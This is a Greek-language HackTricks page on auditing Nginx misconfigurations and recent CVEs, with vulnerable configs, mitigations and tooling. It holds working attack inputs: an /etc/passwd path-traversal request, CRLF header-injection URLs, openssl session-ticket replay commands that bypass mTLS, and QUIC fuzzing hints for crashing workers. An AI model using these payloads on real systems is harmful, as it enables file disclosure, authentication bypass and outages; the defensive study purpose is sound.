# Nginx

{{#include ../../banners/hacktricks-training.md}}


## Missing root location <a href="#missing-root-location" id="missing-root-location"></a>

Κατά τη διαμόρφωση του διακομιστή Nginx, η **root directive** παίζει κρίσιμο ρόλο ορίζοντας τον βασικό κατάλογο από τον οποίο εξυπηρετούνται τα αρχεία. Ας δούμε το παρακάτω παράδειγμα:
```bash
server {
root /etc/nginx;

location /hello.txt {
try_files $uri $uri/ =404;
proxy_pass http://127.0.0.1:8080/;
}
}
```
Σε αυτή τη διαμόρφωση, το `/etc/nginx` ορίζεται ως ο root κατάλογος. Αυτή η ρύθμιση επιτρέπει την πρόσβαση σε αρχεία εντός του καθορισμένου root καταλόγου, όπως το `/hello.txt`. Ωστόσο, είναι κρίσιμο να σημειωθεί ότι έχει οριστεί μόνο μια συγκεκριμένη location (`/hello.txt`). Δεν υπάρχει διαμόρφωση για το root location (`location / {...}`). Αυτή η παράλειψη σημαίνει ότι η οδηγία root εφαρμόζεται παγκοσμίως, επιτρέποντας σε αιτήματα προς το root path `/` να έχουν πρόσβαση σε αρχεία κάτω από το `/etc/nginx`.

Προκύπτει ένα κρίσιμο ζήτημα ασφαλείας από αυτή τη διαμόρφωση. Ένα απλό αίτημα `GET`, όπως `GET /nginx.conf`, θα μπορούσε να εκθέσει ευαίσθητες πληροφορίες εξυπηρετώντας το αρχείο διαμόρφωσης Nginx που βρίσκεται στο `/etc/nginx/nginx.conf`. Ο ορισμός του root σε έναν λιγότερο ευαίσθητο κατάλογο, όπως το `/etc`, μπορεί να μειώσει αυτόν τον κίνδυνο, αλλά ενδέχεται να εξακολουθεί να επιτρέπει ανεπιθύμητη πρόσβαση σε άλλα κρίσιμα αρχεία, συμπεριλαμβανομένων άλλων αρχείων διαμόρφωσης, αρχείων καταγραφής πρόσβασης (access logs), και ακόμη και κρυπτογραφημένων διαπιστευτηρίων που χρησιμοποιούνται για HTTP basic authentication.

## Λανθασμένη διαμόρφωση Alias LFI <a href="#alias-lfi-misconfiguration" id="alias-lfi-misconfiguration"></a>

Στα αρχεία διαμόρφωσης του Nginx, απαιτείται προσεκτική επιθεώρηση των "location" directives. Μια ευπάθεια γνωστή ως Local File Inclusion (LFI) μπορεί να εισαχθεί χωρίς πρόθεση μέσω μιας διαμόρφωσης που μοιάζει με την ακόλουθη:
```
location /imgs {
alias /path/images/;
}
```
Αυτή η διαμόρφωση είναι επιρρεπής σε LFI επιθέσεις λόγω του server που ερμηνεύει αιτήματα όπως `/imgs../flag.txt` ως προσπάθεια πρόσβασης σε αρχεία εκτός του προοριζόμενου καταλόγου, ουσιαστικά επιλύοντας σε `/path/images/../flag.txt`. Αυτό το σφάλμα επιτρέπει σε επιτιθέμενους να ανακτούν αρχεία από το filesystem του server που δεν θα έπρεπε να είναι προσβάσιμα μέσω του web.

Για να μετριαστεί αυτή η ευπάθεια, η διαμόρφωση θα πρέπει να προσαρμοστεί ως εξής:
```
location /imgs/ {
alias /path/images/;
}
```
Περισσότερες πληροφορίες: [https://www.acunetix.com/vulnerabilities/web/path-traversal-via-misconfigured-nginx-alias/](https://www.acunetix.com/vulnerabilities/web/path-traversal-via-misconfigured-nginx-alias/)

Δοκιμές Accunetix:
```
alias../ => HTTP status code 403
alias.../ => HTTP status code 404
alias../../ => HTTP status code 403
alias../../../../../../../../../../../ => HTTP status code 400
alias../ => HTTP status code 403
```
## Μη ασφαλής περιορισμός διαδρομής <a href="#unsafe-variable-use" id="unsafe-variable-use"></a>

Δείτε την παρακάτω σελίδα για να μάθετε πώς να παρακάμπτετε οδηγίες όπως:
```plaintext
location = /admin {
deny all;
}

location = /admin/ {
deny all;
}
```
{{#ref}}
../../pentesting-web/proxy-waf-protections-bypass.md
{{#endref}}

## Μη ασφαλής χρήση μεταβλητών / HTTP Request Splitting <a href="#unsafe-variable-use" id="unsafe-variable-use"></a>

> [!CAUTION]
> Ευάλωτες μεταβλητές `$uri` και `$document_ur`i — αυτό μπορεί να διορθωθεί αντικαθιστώντας τες με `$request_uri`.
>
> Ένα regex μπορεί επίσης να είναι ευάλωτο όπως:
>
> `location ~ /docs/([^/])? { … $1 … }` - Ευάλωτο
>
> `location ~ /docs/([^/\s])? { … $1 … }` - Δεν είναι ευάλωτο (έλεγχος κενών)
>
> `location ~ /docs/(.*)? { … $1 … }` - Δεν είναι ευάλωτο

Μια ευπάθεια στη ρύθμιση του Nginx αποδεικνύεται στο παρακάτω παράδειγμα:
```
location / {
return 302 https://example.com$uri;
}
```
Οι χαρακτήρες \r (Carriage Return) και \n (Line Feed) υποδεικνύουν χαρακτήρες νέας γραμμής σε HTTP αιτήματα, και οι URL-encoded μορφές τους αναπαρίστανται ως `%0d%0a`. Η συμπερίληψη αυτών των χαρακτήρων σε ένα αίτημα (π.χ. `http://localhost/%0d%0aDetectify:%20clrf`) προς έναν λανθασμένα διαμορφωμένο διακομιστή έχει ως αποτέλεσμα ο διακομιστής να εκδώσει μια νέα κεφαλίδα με όνομα `Detectify`. Αυτό συμβαίνει επειδή η μεταβλητή $uri αποκωδικοποιεί τους URL-encoded χαρακτήρες νέας γραμμής, οδηγώντας σε μια απροσδόκητη κεφαλίδα στην απάντηση:
```
HTTP/1.1 302 Moved Temporarily
Server: nginx/1.19.3
Content-Type: text/html
Content-Length: 145
Connection: keep-alive
Location: https://example.com/
Detectify: clrf
```
Μάθετε περισσότερα για τους κινδύνους του CRLF injection και response splitting στο [https://blog.detectify.com/2019/06/14/http-response-splitting-exploitations-and-mitigations/](https://blog.detectify.com/2019/06/14/http-response-splitting-exploitations-and-mitigations/).

Επίσης αυτή η τεχνική [**εξηγείται σε αυτή την παρουσίαση**](https://www.youtube.com/watch?v=gWQyWdZbdoY&list=PL0xCSYnG_iTtJe2V6PQqamBF73n7-f1Nr&index=77) με κάποια ευάλωτα παραδείγματα και μηχανισμούς ανίχνευσης. Για παράδειγμα, για να εντοπίσετε αυτή τη misconfiguration από blackbox σκοπιά μπορείτε να κάνετε τα εξής αιτήματα:

- `https://example.com/%20X` - Οποιοσδήποτε κωδικός HTTP
- `https://example.com/%20H` - 400 Bad Request

Εάν είναι ευάλωτο, το πρώτο θα επιστρέψει καθώς το "X" είναι οποιαδήποτε HTTP μέθοδος και το δεύτερο θα επιστρέψει σφάλμα καθώς το H δεν είναι έγκυρη μέθοδος. Έτσι ο server θα λάβει κάτι σαν: `GET / H HTTP/1.1` και αυτό θα προκαλέσει το σφάλμα.

Άλλα παραδείγματα ανίχνευσης θα ήταν:

- `http://company.tld/%20HTTP/1.1%0D%0AXXXX:%20x` - Οποιοσδήποτε κωδικός HTTP
- `http://company.tld/%20HTTP/1.1%0D%0AHost:%20x` - 400 Bad Request

Κάποιες ευάλωτες διαμορφώσεις που παρουσιάστηκαν σε εκείνη την παρουσίαση ήταν:

- Σημειώστε πώς **`$uri`** τίθεται ως έχει στο τελικό URL
```
location ^~ /lite/api/ {
proxy_pass http://lite-backend$uri$is_args$args;
}
```
- Σημειώστε πώς και πάλι **`$uri`** βρίσκεται στο URL (αυτή τη φορά μέσα σε παράμετρο)
```
location ~ ^/dna/payment {
rewrite ^/dna/([^/]+) /registered/main.pl?cmd=unifiedPayment&context=$1&native_uri=$uri break;
proxy_pass http://$back;
```
- Τώρα στο AWS S3
```
location /s3/ {
proxy_pass https://company-bucket.s3.amazonaws.com$uri;
}
```
### Οποιαδήποτε μεταβλητή

Ανακαλύφθηκε ότι τα **δεδομένα που παρέχονται από τον χρήστη** μπορεί να αντιμετωπίζονται ως **Nginx variable** υπό ορισμένες συνθήκες. Η αιτία αυτής της συμπεριφοράς παραμένει κάπως ασαφής, ωστόσο δεν είναι σπάνια ούτε εύκολη στην επαλήθευση. Αυτή η ανωμαλία επισημάνθηκε σε μια αναφορά ασφάλειας στο HackerOne, η οποία μπορεί να προβληθεί [here](https://hackerone.com/reports/370094). Περαιτέρω διερεύνηση του μηνύματος σφάλματος οδήγησε στον εντοπισμό της εμφάνισής της μέσα στο [SSI filter module of Nginx's codebase](https://github.com/nginx/nginx/blob/2187586207e1465d289ae64cedc829719a048a39/src/http/modules/ngx_http_ssi_filter_module.c#L365), υποδεικνύοντας Server Side Includes (SSI) ως την κύρια αιτία.

Για να **εντοπιστεί αυτή η λανθασμένη διαμόρφωση**, μπορεί να εκτελεστεί η ακόλουθη εντολή, η οποία περιλαμβάνει τοποθέτηση ενός referer header για να δοκιμαστεί η εκτύπωση μεταβλητής:
```bash
$ curl -H ‘Referer: bar’ http://localhost/foo$http_referer | grep ‘foobar’
```
Οι σαρώσεις για αυτήν τη λανθασμένη διαμόρφωση σε συστήματα αποκάλυψαν πολλές περιπτώσεις όπου μεταβλητές του Nginx μπορούσαν να εμφανιστούν σε έναν χρήστη. Ωστόσο, η μείωση του αριθμού των ευάλωτων περιπτώσεων υποδεικνύει ότι οι προσπάθειες να επιδιορθωθεί αυτό το ζήτημα ήταν σε κάποιο βαθμό επιτυχείς.

### Χρήση του try_files με μεταβλητές $URI$ARGS

Η ακόλουθη λανθασμένη διαμόρφωση του Nginx μπορεί να οδηγήσει σε ευπάθεια LFI:
```
location / {
try_files $uri$args $uri$args/ /index.html;
}
```
Στη διαμόρφωσή μας υπάρχει η οδηγία `try_files` που χρησιμοποιείται για έλεγχο της ύπαρξης αρχείων με καθορισμένη σειρά. Το Nginx θα εξυπηρετήσει το πρώτο που βρει. Η βασική σύνταξη της οδηγίας `try_files` είναι η εξής:
```
try_files file1 file2 ... fileN fallback;
```
Nginx θα ελέγχει για την ύπαρξη κάθε αρχείου στη συγκεκριμένη σειρά. Αν ένα αρχείο υπάρχει, θα σερβιριστεί αμέσως. Αν κανένα από τα καθορισμένα αρχεία δεν υπάρχει, το αίτημα θα προωθηθεί στην εναλλακτική επιλογή, η οποία μπορεί να είναι άλλο URI ή μια συγκεκριμένη σελίδα σφάλματος.

Ωστόσο, όταν χρησιμοποιούνται οι μεταβλητές `$uri$args` σε αυτήν την οδηγία, το Nginx θα προσπαθήσει να βρει ένα αρχείο που ταιριάζει με το URI του αιτήματος σε συνδυασμό με οποιεσδήποτε παραμέτρους query string. Επομένως μπορούμε να εκμεταλλευτούμε αυτή τη διαμόρφωση:
```
http {
server {
root /var/www/html/public;

location / {
try_files $uri$args $uri$args/ /index.html;
}
}
}
```
Με το ακόλουθο payload:
```
GET /?../../../../../../../../etc/passwd HTTP/1.1
Host: example.com
```
Χρησιμοποιώντας το payload μας θα ξεφύγουμε από τον ριζικό κατάλογο (ορισμένο στην ρύθμιση του Nginx) και θα φορτώσουμε το αρχείο `/etc/passwd`. Στα debug logs μπορούμε να παρατηρήσουμε πώς ο Nginx δοκιμάζει τα αρχεία:
```
...SNIP...

2025/07/11 15:49:16 [debug] 79694#79694: *4 trying to use file: "/../../../../../../../../etc/passwd" "/var/www/html/public/../../../../../../../../etc/passwd"
2025/07/11 15:49:16 [debug] 79694#79694: *4 try file uri: "/../../../../../../../../etc/passwd"

...SNIP...

2025/07/11 15:49:16 [debug] 79694#79694: *4 http filename: "/var/www/html/public/../../../../../../../../etc/passwd"

...SNIP...

2025/07/11 15:49:16 [debug] 79694#79694: *4 HTTP/1.1 200 OK

```
PoC εναντίον του Nginx χρησιμοποιώντας την παραπάνω διαμόρφωση:
![Παράδειγμα burp request](../../images/nginx_try_files.png)

## Ανάγνωση raw απάντησης του backend

Το Nginx προσφέρει μια δυνατότητα μέσω του `proxy_pass` που επιτρέπει την υποκλοπή σφαλμάτων και HTTP headers που παράγονται από το backend, με σκοπό την απόκρυψη εσωτερικών μηνυμάτων σφάλματος και headers. Αυτό επιτυγχάνεται με το Nginx να σερβίρει προσαρμοσμένες σελίδες σφάλματος ως απάντηση στα σφάλματα του backend. Ωστόσο, προκύπτουν προβλήματα όταν το Nginx συναντά ένα μη έγκυρο HTTP request. Ένα τέτοιο request προωθείται στο backend όπως ελήφθη, και η raw απάντηση του backend αποστέλλεται στη συνέχεια απευθείας στον client χωρίς την παρέμβαση του Nginx.

Ας εξετάσουμε ένα παράδειγμα σεναρίου με μια εφαρμογή uWSGI:
```python
def application(environ, start_response):
start_response('500 Error', [('Content-Type', 'text/html'), ('Secret-Header', 'secret-info')])
return [b"Secret info, should not be visible!"]
```
Για να το διαχειριστείτε αυτό, χρησιμοποιούνται συγκεκριμένες οδηγίες στη διαμόρφωση του Nginx:
```
http {
error_page 500 /html/error.html;
proxy_intercept_errors on;
proxy_hide_header Secret-Header;
}
```
- [**proxy_intercept_errors**](http://nginx.org/en/docs/http/ngx_http_proxy_module.html#proxy_intercept_errors): Αυτή η οδηγία επιτρέπει στο Nginx να εξυπηρετεί μια προσαρμοσμένη απάντηση για backend responses με κωδικό κατάστασης μεγαλύτερο του 300. Εξασφαλίζει ότι, για την παράδειγμα εφαρμογή uWSGI, μια `500 Error` απάντηση παρεμποδίζεται και χειρίζεται από το Nginx.
- [**proxy_hide_header**](http://nginx.org/en/docs/http/ngx_http_proxy_module.html#proxy_hide_header): Όπως υποδηλώνει το όνομα, αυτή η οδηγία κρύβει συγκεκριμένα HTTP headers από τον client, ενισχύοντας το απόρρητο και την ασφάλεια.

Όταν γίνεται ένα έγκυρο `GET` request, το Nginx το επεξεργάζεται κανονικά, επιστρέφοντας μια τυπική error απάντηση χωρίς να αποκαλύπτει οποιαδήποτε μυστικά headers. Ωστόσο, ένα μη έγκυρο HTTP request παρακάμπτει αυτόν τον μηχανισμό, με αποτέλεσμα την έκθεση των ακατέργαστων backend responses, συμπεριλαμβανομένων μυστικών headers και μηνυμάτων σφάλματος.

## merge_slashes ρυθμισμένο σε off

Από προεπιλογή, η **`merge_slashes` directive** του Nginx είναι ρυθμισμένη σε **`on`**, η οποία συμπιέζει πολλαπλές κάθετες (/) σε μια URL σε ένα μόνο slash. Αυτή η λειτουργία, ενώ απλοποιεί την επεξεργασία των URLs, μπορεί ακούσια να κρύψει ευπάθειες στις εφαρμογές πίσω από το Nginx, ιδιαίτερα εκείνες ευαίσθητες σε local file inclusion (LFI) επιθέσεις. Οι ειδικοί ασφαλείας **Danny Robinson and Rotem Bar** έχουν επισημάνει τους πιθανούς κινδύνους που συνδέονται με αυτήν την προεπιλεγμένη συμπεριφορά, ειδικά όταν το Nginx λειτουργεί ως reverse-proxy.

Για να μειωθούν τέτοιοι κίνδυνοι, συνιστάται να **απενεργοποιήσετε τη `merge_slashes` directive** για εφαρμογές ευάλωτες σε αυτές τις επιθέσεις. Αυτό εξασφαλίζει ότι το Nginx προωθεί τα requests στην εφαρμογή χωρίς να αλλάζει τη δομή του URL, και έτσι δεν αποκρύπτει ενδεχόμενα υποκείμενα προβλήματα ασφαλείας.

Για περισσότερες πληροφορίες δείτε [Danny Robinson and Rotem Bar](https://medium.com/appsflyer/nginx-may-be-protecting-your-applications-from-traversal-attacks-without-you-even-knowing-b08f882fd43d).

### **Maclicious Response Headers**

Όπως φαίνεται στο [**this writeup**](https://mizu.re/post/cors-playground), υπάρχουν ορισμένα headers που, εάν υπάρχουν στην απάντηση από τον web server, θα αλλάξουν τη συμπεριφορά του Nginx proxy. Μπορείτε να τα ελέγξετε [**in the docs**](https://www.nginx.com/resources/wiki/start/topics/examples/x-accel/):

- `X-Accel-Redirect`: Υποδεικνύει στο Nginx να κάνει εσωτερική redirect ενός αιτήματος σε μια συγκεκριμένη τοποθεσία.
- `X-Accel-Buffering`: Ελέγχει εάν το Nginx πρέπει να κάνει buffering της απάντησης ή όχι.
- `X-Accel-Charset`: Ορίζει το character set για την απάντηση όταν χρησιμοποιείται το X-Accel-Redirect.
- `X-Accel-Expires`: Ορίζει το χρόνο λήξης για την απάντηση όταν χρησιμοποιείται το X-Accel-Redirect.
- `X-Accel-Limit-Rate`: Περιορίζει το ρυθμό μεταφοράς για απαντήσεις όταν χρησιμοποιείται το X-Accel-Redirect.

Για παράδειγμα, το header **`X-Accel-Redirect`** θα προκαλέσει μια εσωτερική **redirect** στο nginx. Έτσι, έχοντας μια nginx configuration με κάτι όπως **`root /`** και μια απάντηση από τον web server με **`X-Accel-Redirect: .env`** θα κάνει το nginx να στείλει το περιεχόμενο του **`/.env`** (Path Traversal).

### **Default Value in Map Directive**

Στην **Nginx configuration**, η `map` directive συχνά παίζει ρόλο στον έλεγχο **authorization control**. Ένα κοινό λάθος είναι να μην καθοριστεί μια **default** τιμή, κάτι που μπορεί να οδηγήσει σε μη εξουσιοδοτημένη πρόσβαση. Για παράδειγμα:
```yaml
http {
map $uri $mappocallow {
/map-poc/private 0;
/map-poc/secret 0;
/map-poc/public 1;
}
}
```

```yaml
server {
location /map-poc {
if ($mappocallow = 0) {return 403;}
return 200 "Hello. It is private area: $mappocallow";
}
}
```
Χωρίς ένα `default`, ένας **κακόβουλος χρήστης** μπορεί να παρακάμψει την ασφάλεια αποκτώντας πρόσβαση σε ένα **μη ορισμένο URI** μέσα στο `/map-poc`. [The Nginx manual](https://nginx.org/en/docs/http/ngx_http_map_module.html) συμβουλεύει να οριστεί μια **default value** για να αποφευχθούν τέτοια προβλήματα.

### **DNS Spoofing Ευπάθεια**

Το DNS spoofing εναντίον του Nginx είναι εφικτό υπό ορισμένες προϋποθέσεις. Αν ένας επιτιθέμενος γνωρίζει τον **DNS server** που χρησιμοποιεί ο Nginx και μπορεί να υποκλέψει τα DNS queries του, μπορεί να κάνει spoof στα DNS records. Ωστόσο, αυτή η μέθοδος είναι αναποτελεσματική αν ο Nginx είναι διαμορφωμένος να χρησιμοποιεί **localhost (127.0.0.1)** για DNS resolution. Ο Nginx επιτρέπει τον καθορισμό ενός DNS server ως εξής:
```yaml
resolver 8.8.8.8;
```
### **`proxy_pass` και `internal` Οδηγίες**

Η **`proxy_pass`** οδηγία χρησιμοποιείται για την ανακατεύθυνση αιτημάτων σε άλλους διακομιστές, είτε εσωτερικά είτε εξωτερικά. Η **`internal`** οδηγία εξασφαλίζει ότι ορισμένες τοποθεσίες είναι προσβάσιμες μόνο εντός του Nginx. Ενώ αυτές οι οδηγίες από μόνες τους δεν αποτελούν ευπάθειες, η διαμόρφωσή τους απαιτεί προσεκτική εξέταση για να αποφευχθούν κενά ασφαλείας.

## proxy_set_header Upgrade & Connection

If the nginx server is configured to pass the Upgrade and Connection headers an [**h2c Smuggling attack**](../../pentesting-web/h2c-smuggling.md) could be performed to access protected/internal endpoints.

> [!CAUTION]
> Αυτή η ευπάθεια θα επέτρεπε σε έναν επιτιθέμενο να **εγκαθιδρύσει άμεση σύνδεση με το `proxy_pass` endpoint** (`http://backend:9999` σε αυτή την περίπτωση) του οποίου το περιεχόμενο δεν θα ελεγχθεί από το nginx.

Παράδειγμα ευπαθούς διαμόρφωσης για την κλοπή του `/flag` από [εδώ](https://bishopfox.com/blog/h2c-smuggling-request):
```
server {
listen       443 ssl;
server_name  localhost;

ssl_certificate       /usr/local/nginx/conf/cert.pem;
ssl_certificate_key   /usr/local/nginx/conf/privkey.pem;

location / {
proxy_pass http://backend:9999;
proxy_http_version 1.1;
proxy_set_header Upgrade $http_upgrade;
proxy_set_header Connection $http_connection;
}

location /flag {
deny all;
}
```
> [!WARNING]
> Σημειώστε ότι ακόμα και αν το `proxy_pass` έδειχνε σε ένα συγκεκριμένο **path** όπως `http://backend:9999/socket.io`, η σύνδεση θα εγκαθιδρυθεί με `http://backend:9999`, οπότε μπορείτε να **επικοινωνήσετε με οποιοδήποτε άλλο path μέσα σε αυτό το εσωτερικό endpoint. Συνεπώς δεν έχει σημασία αν ένα path καθορίζεται στο URL του proxy_pass.**

## HTTP/3 QUIC module remote DoS & leak (2024)

Το 2024 η Nginx αποκάλυψε τις CVE-2024-31079, CVE-2024-32760, CVE-2024-34161 και CVE-2024-35200, δείχνοντας ότι μία μόνο κακόβουλη QUIC session μπορεί να crash worker processes ή να leak memory όποτε το πειραματικό `ngx_http_v3_module` είναι compiled in και ένα `listen ... quic` socket είναι εκτεθειμένο. Οι επηρεαζόμενες builds είναι 1.25.0–1.25.5 και 1.26.0, ενώ οι 1.27.0/1.26.1 περιλαμβάνουν τις διορθώσεις· η αποκάλυψη μνήμης (CVE-2024-34161) απαιτεί επιπλέον MTUs μεγαλύτερα των 4096 bytes για να εμφανιστούν ευαίσθητα δεδομένα (λεπτομέρειες στο 2024 nginx advisory που αναφέρεται παρακάτω).

**Recon & exploitation hints**

- Το HTTP/3 είναι opt-in, οπότε σκανάρετε για απαντήσεις `Alt-Svc: h3=":443"` ή δοκιμάστε brute-force UDP/443 QUIC handshakes· μόλις επιβεβαιωθεί, fuzzάρετε το handshake και τα STREAM frames με custom `quiche-client`/`nghttp3` payloads για να προκαλέσετε worker crashes και να εξαναγκάσετε log leak.
- Quickly fingerprint target support with:
```bash
nginx -V 2>&1 | grep -i http_v3
rg -n "listen .*quic" /etc/nginx/
```
## Παράκαμψη επανέναρξης συνεδρίας TLS για πιστοποίηση με πιστοποιητικό πελάτη (CVE-2025-23419)

Μια advisory του Φεβρουαρίου 2025 αποκάλυψε ότι το nginx 1.11.4–1.27.3 που έχει χτιστεί με OpenSSL επιτρέπει το **reusing a TLS 1.3 session** από ένα name-based virtual host μέσα σε άλλο, έτσι ώστε ένας client που διαπραγματεύτηκε έναν host χωρίς πιστοποιητικό να μπορεί να επαναπαραγάγει το ticket/PSK και να μεταβεί σε έναν vhost προστατευμένο με `ssl_verify_client on;` και να παρακάμψει πλήρως το mTLS. Το bug ενεργοποιείται όποτε πολλαπλοί virtual hosts μοιράζονται το ίδιο TLS 1.3 session cache και tickets (βλέπε την 2025 nginx advisory που αναφέρεται παρακάτω).

**Πλάνο επιτιθέμενου**
```bash
# 1. Create a TLS session on the public vhost and save the session ticket
openssl s_client -connect public.example.com:443 -sess_out ticket.pem

# 2. Replay that session ticket against the mTLS vhost before it expires
openssl s_client -connect admin.example.com:443 -sess_in ticket.pem -ign_eof
```
Εάν ο στόχος είναι ευάλωτος, το δεύτερο handshake ολοκληρώνεται χωρίς την παρουσία client certificate, αποκαλύπτοντας προστατευμένες τοποθεσίες.

**Τι να ελέγξετε**

- Μεικτά `server_name` μπλοκ που μοιράζονται `ssl_session_cache shared:SSL` και `ssl_session_tickets on;`.
- Admin/API μπλοκ που αναμένουν mTLS αλλά κληρονομούν κοινές ρυθμίσεις session cache/ticket από δημόσιους hosts.
- Αυτοματισμοί που ενεργοποιούν TLS 1.3 session resumption παγκοσμίως (π.χ. Ansible roles) χωρίς να λαμβάνουν υπόψη την απομόνωση vhost.

## Ανθεκτικότητα στο HTTP/2 Rapid Reset (CVE-2023-44487)

Η επίθεση HTTP/2 Rapid Reset (CVE-2023-44487) εξακολουθεί να επηρεάζει το nginx όταν οι χειριστές ανεβάζουν τα `keepalive_requests` ή `http2_max_concurrent_streams` πέρα από τις προεπιλογές: ένας επιτιθέμενος ανοίγει μία HTTP/2 connection, τη γεμίζει με χιλιάδες streams και στη συνέχεια εκδίδει άμεσα frames `RST_STREAM` ώστε το concurrency ceiling να μην επιτευχθεί ποτέ ενώ η CPU συνεχίζει να καταναλώνεται στη tear-down logic. Οι προεπιλογές του nginx (128 concurrent streams, 1000 keepalive requests) διατηρούν το blast radius μικρό· η αύξηση αυτών των ορίων "σημαντικά υψηλότερα" καθιστά εύκολο το να πεινάσουν οι workers ακόμη και από έναν μόνο client (βλ. το write-up της F5 που αναφέρεται παρακάτω).

**Συμβουλές εντοπισμού**
```bash
# Highlight risky knobs
rg -n "http2_max_concurrent_streams" /etc/nginx/
rg -n "keepalive_requests" /etc/nginx/
```
Οι διακομιστές που αποκαλύπτουν ασυνήθιστα υψηλές τιμές για αυτές τις directives είναι ιδανικοί στόχοι: ένας HTTP/2 client μπορεί να επαναλαμβάνει τη δημιουργία streams και να στέλνει άμεσα `RST_STREAM` frames για να διατηρεί την CPU σε πλήρη φόρτο χωρίς να ενεργοποιεί το όριο ταυτόχρονης σύνδεσης.

## Δοκιμάστε το μόνοι σας

Η Detectify δημιούργησε ένα GitHub repository όπου μπορείτε να χρησιμοποιήσετε Docker για να στήσετε τον δικό σας ευάλωτο Nginx test server με μερικές από τις misconfigurations που συζητήθηκαν σε αυτό το άρθρο και να προσπαθήσετε να τις βρείτε μόνοι σας!

[https://github.com/detectify/vulnerable-nginx](https://github.com/detectify/vulnerable-nginx)

## Εργαλεία στατικής ανάλυσης

### [GixyNG](https://github.com/megamansec/gixyng) & [GIXY](https://github.com/yandex/gixy)

GixyNG (ένα ενημερωμένο fork του GIXY) είναι ένα εργαλείο για ανάλυση Nginx configurations, με σκοπό την εύρεση vulnerabilities, insecure directives και επικίνδυνων misconfigurations. Επίσης εντοπίζει misconfigurations που επηρεάζουν την απόδοση και ανιχνεύει χαμένες ευκαιρίες hardening, επιτρέποντας αυτοματοποιημένη ανίχνευση σφαλμάτων.

### [Nginxpwner](https://github.com/stark0de/nginxpwner)

Nginxpwner είναι ένα απλό εργαλείο για την αναζήτηση κοινών Nginx misconfigurations και vulnerabilities.

## Αναφορές

- [**https://blog.detectify.com/2020/11/10/common-nginx-misconfigurations/**](https://blog.detectify.com/2020/11/10/common-nginx-misconfigurations/)
- [**http://blog.zorinaq.com/nginx-resolver-vulns/**](http://blog.zorinaq.com/nginx-resolver-vulns/)
- [**https://github.com/yandex/gixy/issues/115**](https://github.com/yandex/gixy/issues/115)
- [**https://mailman.nginx.org/pipermail/nginx-announce/2024/GWH2WZDVCOC2A5X67GKIMJM4YRELTR77.html**](https://mailman.nginx.org/pipermail/nginx-announce/2024/GWH2WZDVCOC2A5X67GKIMJM4YRELTR77.html)
- [**https://mailman.nginx.org/pipermail/nginx-announce/2025/NYEUJX7NCBCGJGXDFVXNMAAMJDFSE45G.html**](https://mailman.nginx.org/pipermail/nginx-announce/2025/NYEUJX7NCBCGJGXDFVXNMAAMJDFSE45G.html)
- [**https://www.f5.com/company/blog/nginx/http-2-rapid-reset-attack-impacting-f5-nginx-products**](https://www.f5.com/company/blog/nginx/http-2-rapid-reset-attack-impacting-f5-nginx-products)


{{#include ../../banners/hacktricks-training.md}}
